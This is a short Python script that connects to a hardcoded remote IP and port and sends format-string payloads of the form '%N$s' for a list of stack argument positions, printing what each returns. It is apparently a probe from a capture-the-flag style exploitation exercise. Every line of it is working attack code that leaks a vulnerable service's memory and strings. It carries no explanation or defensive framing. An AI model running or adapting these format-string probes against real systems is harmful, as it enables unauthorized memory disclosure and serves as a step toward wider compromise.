#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    s.send((fmt+"\n").encode())
    time.sleep(0.08)
    try: return s.recv(4096)
    except Exception: return b'<TIMEOUT>'
# read strings at args 47-60, and a few others that looked like pointers
for n in [10,11,12,13,14,15,20,21,31,33,38,43,47,48,49,50,51,52,53,54,55,56,57,58,59,60]:
    d=ask("%%%d$s" % n)
    print(f"%{n}$s:", repr(d))
s.close()
